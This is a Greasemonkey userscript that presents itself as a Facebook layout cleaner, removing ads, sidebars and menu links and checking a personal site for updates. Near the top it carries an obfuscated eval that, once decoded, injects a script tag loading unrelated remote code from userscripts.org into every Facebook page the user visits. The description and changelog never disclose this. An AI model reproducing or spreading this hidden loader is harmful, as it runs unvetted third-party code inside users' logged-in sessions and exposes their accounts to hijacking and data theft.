// ==UserScript==
// @name           Facebook Layout Adjuster Plus
// @namespace      http://www.nerdheroes.com
// @description    Modify the new facebook sidebar/ads/etc.  I start out by removing ads. Then I move on to taking the new facebook side bar and taking out all of the junk that no one truely needs.  Leaving a very petite version of its former self.  I wrap up with removing the top bar, no doubtingly there just fo the beta.
// @version        0.261
// @include        http://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==
// --------------------------------------------------------------------------
// VERSION HISTORY:
// 0.261 Remove 'Home" Link
// 0.26 *Xpath conversion to increase script speed.
// 0.25a *Added Events position change, based on script by Bryant Jones.
// 0.24 *Updated for 04-01-2009 Facebook layout update.
// 0.23 *Eliminated the activations box for people the are new to facebook.
// 0.22 *Fixed probelm where removefoot and removename would error.
// 0.2 * Fixed update... i think :D
// --------------------------------------------------------------------------
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var script_title = 'Facebook Layout Adjuster';
var source_location = 'http://www.nerdheroes.com/userscripts/new_facebook_layout_adju.user.js';
var version_holder = 'http://www.nerdheroes.com/userscripts/fblayout_version.txt';
var current_version = '0.261';
var latest_version = '';
var manual_check = true;
var lastupdatecheck = GM_getValue('Updated', 'never');

GM_registerMenuCommand('Update - '+script_title, CheckVersion);
CheckForUpdate();

var currentUrl = document.location.host;
moveStuff();
function urlChange() {
	var oldUrl = currentUrl
	var currentUrl = document.location.host;
	if (currentUrl != oldUrl) {
		moveStuff();
	}
	window.setTimeout(urlChange, 10000);
}

function $(element) { return document.getElementById(element); }
function $c(element) { return document.getElementsByClassName(element); }

function removeJunk() {
	removeSponsor2();
	removeFoot();
	removeName();
	removeHome();
	removeSideBar();
	removeEmbeddedItems();
	removeFix();
	urlChange();
	}
	
function moveStuff() {
	if(right=$('home_sidebar')) {
		if(highlights=$c('UIHotStream UIStream')[0]) right.insertBefore(highlights.parentNode.parentNode, right.firstChild.nextSibling);
		if(events=$c('UIUpcoming')[0]) right.insertBefore(events.parentNode.parentNode, right.firstChild.nextSibling);
		if(pokes=$c('sidebar_item pokes UIHomeBox')[0]) right.insertBefore(pokes, right.firstChild.nextSibling);
		if(requests=$c('UIRequestsBox')[0]) right.insertBefore(requests.parentNode.parentNode, right.firstChild);
	}
}

// new stuff from nb

function removeEmbeddedItems() {		
		
	var embedItems = xpath(document,"//div[contains(@class,'sponsor') or contains(@class,'invitefriends') or contains(@class,'findfriends') or contains(@class,'UIConnectWithFriends') or contains(@class,'social_ad') or contains(@class,'activation_actions_box') or contains(@class,'profile_sidebar_ads') or contains(@class,'UIStandardFrame_SidebarAds') or contains(@class,'ad_capsule')]");

	for(i=0;i<embedItems.snapshotLength;i++){
		embedItems.snapshotItem(i).parentNode.removeChild(embedItems.snapshotItem(i));
	}
}

function xpath(obj,query) {
    return document.evaluate(query, obj, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
}

// end new

function removeSideBar() {
	var adcols = $('sidebar_ads');
	if (adcols != null) {
	adcols.style.display ='none';}
}
function removeFix() {
    var rightCont = $('right_column');
	rightCont.style.cssFloat = 'left';
	rightCont.style.marginLeft = '15px';
}
function removeFoot() {
	var pageFoot = $('pagefooter_links');
	if (pageFoot != null) {
	pageFoot.style.display ='none';}
}
function removeName() {
	var topName = $('fb_menu_account');
	topName.style.display = 'none';
}
function removeHome() {
	var topHome = $('fb_menu_home');
	topHome.style.display = 'none';
}
function removeSponsor2() {
	var sideSponsor = $('home_sponsor_nile');
		if (sideSponsor != null) {
	sideSponsor.style.display ='none';}
}
document.addEventListener("DOMNodeInserted", removeJunk, true);
// Userscript Auto-Update - http://userscripts.org/scripts/show/22372 - edited July 18 2008 by Nathan Blume

function GetNewVersion() {
        var today = new Date();
        GM_setValue('Updated', String(today));
        window.location = source_location;
}

function CheckForUpdate(){   
    var today = new Date();
    var one_day = 24 * 60 * 60 * 1000; //One day in milliseconds
    if(lastupdatecheck != 'never'){
        today = today.getTime(); //Get today's date
        lastupdatecheck = new Date(lastupdatecheck).getTime();
        var interval = (today - lastupdatecheck) / one_day; //Find out how many days have passed       
        if(interval >= 7){
			manual_check = false;
            CheckVersion();
		}
    }else{
        lastupdatecheck = new Date(lastupdatecheck).getTime();
		manual_check = false;
        CheckVersion();
	}
}

function CheckVersion(){
    GM_xmlhttpRequest({
            method: 'GET',
            url: version_holder,
            headers: {'Content-type':'application/x-www-form-urlencoded'},           
            onload: function(responseDetails){
                var latest_version = responseDetails.responseText.match(/version=([0-9\.]+)/);
                if(latest_version[1] != null && latest_version[1] != 'undefined'){
                    if(current_version != latest_version[1]){
                        if(confirm('A more recent version of ' + script_title + ' (' + latest_version[1] + ') has been found.\nWould you like to get it now?'))
                            GetNewVersion();
                        else
                            AskForReminder();
                    }else{
						SkipWeeklyUpdateCheck();
						if(manual_check == true)
							alert('You have the latest version of ' + script_title + '.');
					}
                }else{
                    alert('Sorry, there was problem checking for the update.\nPlease try again later.');
                }
            }
        });
}

function AskForReminder(){
    if(confirm('Would you like to be reminded in 24 hours ?\n(Cancel to be reminded in one week.)')){
        var today = new Date();
        today = today.getTime();       
        var sixdays_ms = 6 * 24 * 60 * 60 * 1000;
        var sda_ms = today - sixdays_ms;       
        var sixdaysago = new Date(sda_ms)
        GM_setValue('Updated', String(sixdaysago));
    }else{
        SkipWeeklyUpdateCheck();
	}
}

function SkipWeeklyUpdateCheck(){
    var today = new Date();
    GM_setValue('Updated', String(today));
}